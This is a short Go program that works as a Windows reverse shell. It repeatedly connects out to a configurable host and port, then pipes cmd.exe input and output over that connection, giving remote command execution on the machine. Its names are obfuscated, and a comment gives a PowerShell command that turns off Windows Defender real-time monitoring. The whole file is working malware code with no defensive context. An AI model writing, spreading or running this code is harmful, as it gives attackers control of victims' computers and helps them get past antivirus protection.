package main

import (
 "fmt"
 "net"
 "os"
 "os/exec"
 "time"
)

var (
 a1 = "ip"
 a2 = 4345
)
//Set-MpPreference -DisableRealtimeMonitoring $true
func e1() {
 if a1 == "0.0.0.0" || a2 == 0 {
  fmt.Fprintln(os.Stderr, "[ERROR] a1 and/or a2 not defined.")
  os.Exit(1)
 }
}

func e2() net.Conn {
 var c net.Conn
 var err error
 for {
  c, err = net.Dial("tcp", fmt.Sprintf("%s:%d", a1, a2))
  if err == nil {
   break
  }
  time.Sleep(5 * time.Second)
 }
 return c
}

func e3(c net.Conn) {
 cmd := exec.Command("cmd")
 cmd.Stdin = c
 cmd.Stdout = c
 cmd.Stderr = c
 err := cmd.Start()
 if err != nil {
  fmt.Fprintln(os.Stderr, "[ERROR] cmd start failed:", err)
  os.Exit(1)
 }
 cmd.Wait()
}

func main() {
 e1()
 c := e2()
 e3(c)
}
